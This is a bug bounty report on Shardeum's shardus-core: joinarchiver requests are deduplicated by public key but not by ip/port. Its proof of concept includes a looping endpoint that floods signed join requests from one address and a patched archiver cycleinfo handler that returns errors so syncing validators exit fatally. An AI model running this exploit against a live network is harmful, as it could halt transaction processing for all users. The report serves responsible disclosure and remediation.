# 33576 - \[BC - High] Lack of deduplication in joinarchiver requests ...

Submitted on Jul 24th 2024 at 01:42:01 UTC by @GuplerSaxanoid for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33576

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

An adversary is able to register a single archiver node multiple times under different public keys due to lack of duplication checks against ip/port pairs in `joinarchiver` request validations. This allows the attacker to exhaust the maximum limit enforced on number of archivers that can join a shard, with the malicious archiver occupying majority of indices in archivers list. The malicious archiver is able to bring down syncing validator nodes with a fatal error.

## Vulnerability Details

During the request validation process in `joinarchiver` route, the program attempts to detect duplicate archivers by equating the public key in the request to the public keys that already exist. However, there is no attempt to detect duplicates based on ip/port values. This allows an attacker to register a single archiver node multiple times under different public keys to an extent that they exhaust the maximum limit on number of archivers that can join a shard.

There are several occasions in the program where a random archiver is chosen to access the list of active node in the network or the current cycle info:

1. When a standby node attempts to join the active set (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/Self.ts#L228>)
2. When a node attempts to sync with the existing active nodes (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/Self.ts#L190>)
3. When a standby node makes a standby-refresh (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/Join/v2/standbyRefresh.ts#L16>)

When a node attempts to sync with the active set, it makes a call to '/cycleinfo/:count' endpoint of a randomly chosen archiver. If the archiver returns an error response, the validator node shuts down with a fatal error.

A malicious archiver can be programed to always returns an erroneous response through cycleinfo calls. But, since archiver is selected randomly, the probability that the malicious archiver is selected should outweigh the probability that an honest archiver is selected.

In a network with 10 archiver nodes and 128 nodes-per-shard, 64 archivers can join the shard. Subtracting the 10 archiver nodes, the malicious archiver can present itself under 54 different public keys on each shard. The probability that the malicious archiver will be selected by syncing validator is approximately 0.84. Thus, syncing nodes are under a high probability of attack from the malicious validator.

## Impact Details

Since archiver nodes are expected to present themselves on every shard to subscribe to all of the state changes, the attack is imminent on every shard. All of the validator nodes in a shard will go through the syncing phase, where they are vulnerable to attack from the malicious archiver with a high probability. Hence, this exploit will cause a total network shutdown.

## Proof of Concept

1. Register the following external POST endpoint in validator:

```
shardus.registerExternalPost('archiver-join-hijack', externalApiMiddleware, async (req, res) => {
    while(true) { 
      const keypair = crypto.generateKeypair();
      const curveKey = crypto.convertPkToCurve(keypair.publicKey);

      const payload: ArchiversTypes.Request = crypto.signObj({
        nodeInfo: {
          curvePk: curveKey,
          ip: "127.0.0.1",
          port: 4000,
          publicKey: keypair.publicKey
        },
        appData: {
          version: AccountsStorage.cachedNetworkAccount.current.archiver.activeVersion
        },
        requestType: ArchiversTypes.RequestTypes.JOIN,
        requestTimestamp: (CycleChain.newest.start + CycleChain.newest.duration)*1000

      },keypair.secretKey, keypair.publicKey) as ArchiversTypes.Request;

      await Comms.sendGossip(
        'joinarchiver',
        payload,
        null,
        null,
        nodeListFromStates([
          P2P.P2PTypes.NodeStatus.ACTIVE,
          P2P.P2PTypes.NodeStatus.READY,
          P2P.P2PTypes.NodeStatus.SYNCING,
       ]),
       true
      )
    }

    return res.json("")
  })
```

PATCH file: <https://gist.github.com/guplersaxanoid/153c6e2bed13d474ff3d1a07c7457457#file-validator-node-patch>

NOTE: The above endpoint makes a call through gossip route instead of the external `joinarchiver` endpoint. This is done for ease of implementation in generating new public keys and signing the payload. However, the gossip route goes through the same deduplication process as the external endpoint, and both of them are equally vulnerable. This is to say that, a malicious validator is not required to perform this attack, the payloads can be signed by an external user/archiver and sent to an active node.

2. Alter `cycleinfo/:count` endpoint in @shardus/archiver module to the following to enact malicious archiver after 10 cycles:

```
server.get('/cycleinfo/:count', async (_request: CycleInfoCountRequest, reply) => {
    if(Cycles.getCurrentCycleCounter() > 10) {
      reply.send({ success: false, error: `Invalid count` })
      return
    }
    const err = Utils.validateTypes(_request.params, { count: 's' })
    if (err) {
      reply.send({ success: false, error: err })
      return
    }
    let count: number = parseInt(_request.params.count)
    if (count <= 0 || Number.isNaN(count)) {
      reply.send({ success: false, error: `Invalid count` })
      return
    }
    if (count > MAX_CYCLES_PER_REQUEST) count = MAX_CYCLES_PER_REQUEST
    const res = await Cycles.getLatestCycleRecords(count)
    reply.send(res)
  })
```

PATCH file: <https://gist.github.com/guplersaxanoid/153c6e2bed13d474ff3d1a07c7457457#file-archiver-node-patch>

IMPORTANT: Make sure to link the modified @shardus/archiver module to node\_modules in shardeum using `npm link`

3. spin up a local network in debug mode
4. wait for a few nodes to go active
5. Make a call to 'archiver-join-hijack' endpoint in an active validator node, the program will enter an infinite loop. Wait until you see the following warning logs in active nodes:

```
[2024-07-23T18:54:36.489] [WARN] p2p - Archiver: addJoinRequest: This archiver cannot join as max archivers limit has been reached
[2024-07-23T18:54:36.489] [WARN] p2p - Archiver: Archiver join request not accepted.
```

6. SIGKILL the previous call. Make a call to `archivers` endpoint to notice that archivers list contains multiple archivers pointing to same ip/port
7. Let the network run for a few cycles and observe that the syncing nodes goes offline with a fatal error.

Here are exit summaries from two random validator nodes for evidence: <https://gist.github.com/guplersaxanoid/153c6e2bed13d474ff3d1a07c7457457#file-exit-summary-2-json> <https://gist.github.com/guplersaxanoid/153c6e2bed13d474ff3d1a07c7457457#file-exit-summary-1-json>
